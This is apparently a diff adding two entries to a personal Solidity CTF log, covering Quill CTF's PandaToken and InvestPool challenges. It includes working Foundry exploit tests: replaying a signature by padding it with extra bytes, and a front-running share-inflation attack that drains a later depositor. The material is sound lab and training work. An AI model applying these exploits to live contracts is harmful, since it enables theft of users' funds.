@@ -1071,4 +1071,107 @@ contract VoteTokenTest is Test {
 }
 ```
 
+### 2024.09.16
+
+- Quill CTF: PandaToken
+
+#### PandaToken
+check layout:
+```
+➜  test-quill git:(main) ✗ forge inspect ./src/pandaToken.sol:PandaToken storage-layout --pretty
+| Name           | Type                                            | Slot | Offset | Bytes | Contract                      |
+|----------------|-------------------------------------------------|------|--------|-------|-------------------------------|
+| _balances      | mapping(address => uint256)                     | 0    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _allowances    | mapping(address => mapping(address => uint256)) | 1    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _totalSupply   | uint256                                         | 2    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _name          | string                                          | 3    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _symbol        | string                                          | 4    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _owner         | address                                         | 5    | 0      | 20    | src/pandaToken.sol:PandaToken |
+| c1             | uint256                                         | 6    | 0      | 32    | src/pandaToken.sol:PandaToken |*
+| usedSignatures | mapping(bytes => bool)                          | 7    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| burnPending    | mapping(address => uint256)                     | 8    | 0      | 32    | src/pandaToken.sol:PandaToken |
+```
+
+calculateAmount = (input * 1000) / (599 + 1 + c1) => c1 = 400 => calculateAmount = input
+
+The contract is little misleading since the root cause is the signature **don't** have a length check, and when decoding from bytes, it will only take care about the first 65.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+import "../src/pandaToken.sol";
+
+contract PandaTokenHack is Test {
+    PandaToken pandatoken;
+    address owner = vm.addr(1);
+    address hacker = vm.addr(2);
+
+    function setUp() external {
+        vm.prank(owner);
+        pandatoken = new PandaToken(400, "PandaToken", "PND");
+    }
+
+    function test() public {
+        vm.startPrank(hacker);
+        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
+
+        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
+        // solution
+        pandatoken.balanceOf(owner);
+        pandatoken.balanceOf(hacker);
+
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v));
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"1111")));
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"2222")));
+       
+
+        assertEq(pandatoken.balanceOf(hacker), 3 ether);
+    }
+}
+```
+
+### 2024.09.17
+
+- Quill CTF: InvestPool
+
+ref: https://github.com/Kaiziron/quill-ctf-writeup/blob/main/invest-pool.md
+
+
+```solidity
+    function test_hack() public {
+        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
+		vm.startPrank(hacker);
+
+        // solution
+        string memory pass = 'j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx';
+        pool.initialize(pass);
+
+        // front run
+        pool.deposit(1);
+        token.transfer(address(pool), 500e18);
+
+        vm.stopPrank();
+        userDeposit(1000e18);
+        vm.startPrank(hacker);
+
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+        console.log("Hacker token balance :", token.balanceOf(hacker));
+
+        pool.withdrawAll();
+        
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+
+
+		vm.stopPrank();
+        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
+    }
+```
+
 <!-- Content_END -->
